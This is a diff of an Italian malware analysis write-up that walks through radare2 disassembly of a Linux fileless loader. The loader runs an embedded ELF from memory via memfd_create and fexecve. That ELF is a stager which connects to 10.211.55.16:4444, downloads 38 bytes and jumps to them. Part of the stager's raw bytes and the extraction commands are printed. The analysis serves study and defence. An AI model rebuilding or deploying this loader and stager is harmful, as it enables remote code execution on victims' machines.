@@ -219,7 +219,6 @@ NO_ELF
 0x00400854 call sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)</div><pre>;disabilita il buffering per gli stream standard stdin, stdout e stderr.  Disabilitare il buffering degli stream standard nei malware (e anche in altri tipi di software dannoso) è una tecnica comune per ottenere un controllo più immediato e preciso sulle operazioni di input e output. In un contesto normale, i flussi standard come stdout (output) sono bufferizzati per ottimizzare le prestazioni: il sistema operativo accumula l'output in un buffer e lo scrive a destinazione solo quando il buffer è pieno o quando il programma termina. È una tecnica utilizzata per garantire un'esecuzione più controllata, reattiva e tempestiva. Questo è particolarmente importante per mantenere un flusso di comunicazione stabile e immediato tra il malware e i sistemi esterni, prevenire la perdita di dati e ridurre il rischio di comportamenti anomali o di arresti imprevisti.
 
 ;l’idea di qualcosa contenuto in qualcos’altro, che a sua volta contiene qualcosa di più piccolo e così via, richiama l’idea della reductio ad infinitum.
-
 </pre><div class="article">0x00400859 mov qword [var_20h], 0
 0x00400861 mov qword [var_10h], 0
 0x00400869 call sym.imp.getpid ; int getpid(void)
@@ -227,9 +226,7 @@ NO_ELF
 0x00400870 mov edi, str.pid__d ; 0x400978 ; "pid,%d" ; const char *format
 0x00400875 mov eax, 0
 0x0040087a call sym.imp.printf ; int printf(const char *format)</div><pre>
-
 ;ottiene il pid del processo e lo stampa; perchè fa sta cosa? non l'ho capito.
- 
 </pre><div class="article">0x0040087f mov edx, 1
 0x00400884 mov esi, str.no_elf ; 0x40097f ; "no_elf"
 0x00400889 mov edi, 0x13f ; 319
@@ -253,7 +250,6 @@ NO_ELF
 0x004008a3 mov esi, 0x400988 ; const char *ptr
 0x004008a8 mov edi, eax ; int fd
 0x004008aa call sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t nbytes)</div><pre>
-
 ;ottiene il file descriptor del file creato in memoria e va a scriverci 256 byte presenti in questa locazione di memoria 0x400988, che si riferisce a una parte della sezione .rodata.
 
 ;il blocco di dati di 256 byte che inizia con un header ELF valido e include i vari campi e le informazioni necessari per identificare e utilizzare il file eseguibile ELF. È fondamentale che la sequenza di byte e i loro valori siano coerenti con le specifiche del formato ELF, il che sembra essere il caso in questa situazione.
@@ -263,7 +259,6 @@ NO_ELF
 0x004008ba mov rsi, rcx
 0x004008bd mov edi, eax
 0x004008bf call sym.imp.fexecve</div><pre>
-
 ;va ad eseguire dalla memoria, i 256 byte del file che è stato copiato dalla .rodata.
 </pre><div class="article">0x004008c4 mov rax, qword [ptr]
 0x004008c8 mov rdi, rax ; void *ptr
@@ -274,13 +269,11 @@ NO_ELF
 0x004008d9 xor rcx, qword fs:[0x28]
 0x004008e2 je 0x4008e9
 0x004008e4 call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</div><pre>
-
 ;controllo del canarino sullo stack
 
 ;ugualmente, possiamo invertire il senso di apertura della bambola e prolungarla all’infinito verso la grandezza. Qualcosa di grande che è sua volta è contenuto da qualcosa di più grande, ad libitum. libidine, doppia libidine, libidine con i fiocchi!
 </pre><div class="article">0x004008e9 leave
 0x004008ea ret</div><pre>
-
 ;objcopy --dump-section .rodata=rodata.bin 
 4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4
 ;hexdump -C rodata.bin
@@ -306,7 +299,6 @@ NO_ELF
 0x00400a48 0f05 5948 85c0 7925 49ff c974 1857 6a23 ..YH..y%I..t.Wj#
 0x00400a58 586a 006a 0548 89e7 4831 f60f 0559 595f Xj.j.H..H1...YY_
 </div><pre>
-
 ;ecco il disassemblato del file elf estratto dalla sezione .rodata del malware.
 </pre><div class="article">[0x00400078]> pdf
 ;-- rip:
@@ -323,7 +315,6 @@ NO_ELF
 0x00400089 pop r10
 0x0040008b mov dl, 7
 0x0040008d syscall</div><pre>
-
 ;la syscall effettuata è mmap con i seguenti argomenti:
 
 ;rdi = 0 → Indirizzo suggerito (il kernel sceglierà un indirizzo).
@@ -334,7 +325,6 @@ NO_ELF
 ;r8 = 0 → Offset (non usato perché non si mappa un file).
 </pre><div class="article">0x0040008f test rax, rax
 0x00400092 js 0x4000e5</div><pre>
-
 ;se la chiamata mmap fallisce (ossia, rax è negativo), il flusso salta a un
 gestore di error.
 </pre><div class="article">0x00400094 push 0xa ; 10
@@ -343,7 +333,6 @@ gestore di error.
 0x00400099 push 0x29 ; ')' ; 41
 0x0040009b pop rax
 0x0040009c cdq</div><pre>
-
 ;se eax è positivo, edx viene impostato a 0; se eax è negativo, edx viene
 impostato a 0xFFFFFFFF (cioè, tutti i bit a 1).
 </pre><div class="article">0x0040009d push 2 ; 2
@@ -351,15 +340,12 @@ impostato a 0xFFFFFFFF (cioè, tutti i bit a 1).
 0x004000a0 push 1 ; 1
 0x004000a2 pop rsi
 0x004000a3 syscall</div><pre>
-
 ;41 sys_socket int family int type int protocol.
 ;qui si sta creando un socket di tipo SOCK_STREAM (TCP) usando socket().
 </pre><div class="article">0x004000a5 test rax, rax
 0x004000a8 js 0x4000e5</div><pre>
-
 ;se il socket non viene creato correttamente, il flusso salta di nuovo al
 gestore di errori.
-
 </pre><div class="article">0x004000aa xchg rdi, rax
 0x004000ac movabs rcx, 0x1037d30a5c110002
 0x004000b6 push rcx
@@ -369,7 +355,6 @@ gestore di errori.
 0x004000bd push 0x2a ; '*' ; 42
 0x004000bf pop rax
 0x004000c0 syscall</div><pre>
-
 ;42 sys_connect int fd struct sockaddr *uservaddr int addrlen
 ;qui il codice si prepara per la chiamata connect() per collegarsi
 all'indirizzo IP 10.211.55.16 sulla porta 4444, come abbiamo discusso in precedenza.
@@ -379,11 +364,9 @@ Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in de
 </pre><div class="article">0x004000c2 pop rcx
 0x004000c3 test rax, rax
 0x004000c6 jns 0x4000ed</div><pre>
-
 ;se la connessione ha successo, salta al codice successivo
 </pre><div class="article">0x004000c8 dec r9
 0x004000cb je 0x4000e5</div><pre>
-
 ;fa 10 tentativi, se falliscono tutti salta al blocco dell'exit.
 </pre><div class="article">0x004000cd push rdi
 0x004000ce push 0x23 ; '#' ; 35
@@ -393,7 +376,6 @@ Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in de
 0x004000d5 mov rdi, rsp
 0x004000d8 xor rsi, rsi
 0x004000db syscall</div><pre>
-
 ;35 sys_nanosleep struct timespec *rqtp struct timespec *rmtp
 ;dovrebbe sleeppare per 5 secondi.
 </pre><div class="article">0x004000dd pop rcx
@@ -401,7 +383,6 @@ Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in de
 0x004000df pop rdi
 0x004000e0 test rax, rax
 0x004000e3 jns 0x4000ac</div><pre>
-
 ;controlla se ha fallito la nanosleep, se non è fallita torna indietro e
 riprova a connettersi.
 </pre><div class="article">0x004000e5 push 0x3c ; '<' ; 60
@@ -409,21 +390,18 @@ riprova a connettersi.
 0x004000e8 push 1 ; 1
 0x004000ea pop rdi
 0x004000eb syscall</div><pre>
-
 ;60 sys_exit int error_code
 ;blocco di uscita con errore.
 </pre><div class="article">0x004000ed pop rsi
 0x004000ee push 0x26 ; '&' ; 38
 0x004000f0 pop rdx
 0x004000f1 syscall</div><pre>
-
 ;viene la read passandogli l'indirizzo in rsi (che è la cima dello stack) come buffer; in rdi abbiamo l'fd aperto, poi con jmp rsi si va ad eseguire proprio quei 38 byte appena scaricati. la sequenza di chiamate di sistema porta alla lettura di un payload remoto e alla sua esecuzione. Se ci sono errori durante la lettura, il codice esegue un salto a un gestore di errori. Ma se tutto va a buon fine, il codice scaricato verrà eseguito, consentendo al potenziale attaccante di controllare il sistema.
 
 ;gestire gli errori? È facile! Basta ignorarli finché non diventano abbastanza grandi da invitarti a cena!
 </pre><div class="article">0x004000f3 test rax, rax
 0x004000f6 js 0x4000e5
 0x004000f8 jmp rsi</div><pre>
-
 ;qui dovrebbe saltare al codice che viene scaricato.
 
 ;giocando a prolungare le matrioske, ci siamo spinti oltre le nostre umane
